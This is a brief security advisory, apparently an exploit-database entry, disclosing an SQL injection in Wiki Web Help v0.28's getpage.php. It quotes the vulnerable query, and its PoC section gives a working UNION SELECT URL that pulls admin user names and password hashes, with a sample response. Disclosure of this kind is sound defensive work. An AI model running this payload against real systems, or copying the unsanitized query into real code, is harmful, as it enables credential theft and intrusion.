@@ -1,0 +1,35 @@
+# Version: v0.28 (Possible all versions)
+# Vendor: Richard Bondi - http://wikiwebhelp.org
+# Download: http://wikiwebhelp.org/release/wwh-0.2.8.zip
+
+# Description: "The goal of this project is to create a help
+application that is editable by the community. Standard wiki systems
+are great for many applications. The help application and the wiki is
+an ideal marriage. The problem with the standard wiki in a help
+application is that it leaves you jumping around and does not have the
+smooth flow that we have with a desktop chm type viewer. This project
+aims to return that smooth flow to your wiki based help application."
+
+# Credit: Vulnerability founded by Canberk BOLAT at ADEO Security Labs
+        - Mail: security[AT]adeo.com.tr
+        - Web: http://security.adeo.com.tr
+
+# Vulnerability:
+In the file named as getpage.php user input don't used in single quotes.
+
+handlers/getpage.php
+---[snip]---
+4	if($page==null) $page = $_GET['id'];
+
+5	
+
+6	$sql = "SELECT * FROM page INNER JOIN node ON
+node.node_id=page.node_id WHERE node.node_id=$page";
+---[snip]---
+
+Its successfully exploitable. Please see # PoC section.
+
+# PoC:
+Request: http://server/handlers/getpage.php?id=9999999+UNION+SELECT+1,CONCAT_WS(0x3a,user_name,password),3,4,5,6,7+FROM+user+LIMIT+1
+
+Response: admin:21232f297a57a5a743894a0e4a801fc3
